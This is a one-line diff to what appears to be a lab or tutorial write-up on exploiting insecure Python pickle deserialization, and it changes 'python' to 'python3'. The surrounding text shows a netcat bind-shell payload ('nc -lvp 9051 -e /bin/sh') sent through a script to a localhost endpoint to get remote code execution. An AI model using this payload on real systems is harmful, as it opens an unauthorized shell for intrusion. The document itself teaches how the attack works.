@@ -89,7 +89,7 @@ $ python3 serializaPickle.py "sleep 10" http://localhost:5000/user
 In order to show how an attacker could have access to the server through a RCE, we will use the code depicted on the image below to create a bind shell on the server's 9051 port.
 
 ```sh
-$ python serializaPickle.py "nc -lvp 9051 -e /bin/sh" http://localhost:5000/user
+$ python3 serializaPickle.py "nc -lvp 9051 -e /bin/sh" http://localhost:5000/user
 ```
 
 <img src="attack10.png" align="center"/>
